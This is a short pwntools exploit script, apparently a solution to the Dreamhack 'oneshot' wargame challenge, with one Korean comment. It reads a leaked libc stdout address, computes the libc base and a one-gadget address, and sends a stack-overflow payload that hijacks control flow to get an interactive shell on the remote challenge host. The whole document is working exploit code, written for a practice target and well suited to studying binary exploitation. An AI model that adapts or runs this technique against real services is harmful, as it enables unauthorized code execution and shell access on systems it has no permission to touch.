from pwn import *

r = remote("host3.dreamhack.games", 9616)

e = ELF("./oneshot")
libc = ELF("./libc.so.6")

r.recv(8)
stdout = r.recvline()
stdout = stdout[:-1]
stdout = int(stdout, 16) # base 구할 재료

libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
print(hex(libc.symbols["_IO_2_1_stdout_"]))
og = libc_base + 0x45216

payload = b'\x00' * 40
og = p64(og)
og = og[:-2]
payload += og
r.sendafter("MSG: ", payload)

r.interactive()